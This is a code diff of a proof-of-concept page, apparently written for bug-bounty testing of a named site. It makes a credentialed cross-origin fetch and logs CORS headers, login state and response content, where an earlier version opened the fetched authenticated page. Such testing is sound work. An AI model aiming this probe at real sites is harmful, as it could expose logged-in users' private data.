@@ -12,18 +12,15 @@
     function loadPage() {
       fetch("https://intigriti.ilias-solutions.com/intigriti/assmgmt/", {
         credentials: "include"
-      })
-        .then(r => r.text())
-        .then(html => {
-          // Patch relative paths to load from the real domain
-          const patchedHtml = html.replace(
-            /<head>/i,
-            `<head><base href="https://intigriti.ilias-solutions.com/intigriti/assmgmt/">`
-          );
-          const win = window.open();
-          win.document.write(patchedHtml);
-          win.document.close();
-        });
+      }).then(async r => {
+        const txt = await r.text();
+        console.log("Status:", r.status);
+        console.log("ACAO:", r.headers.get("access-control-allow-origin"));
+        console.log("ACAC:", r.headers.get("access-control-allow-credentials"));
+        console.log("Looks logged in?:", /logout|username|ng-app="assmgmt"/i.test(txt) && !/login/i.test(txt));
+        console.log(txt.slice(0, 500)); // peek
+      });
+
     }
   </script>
 </body>
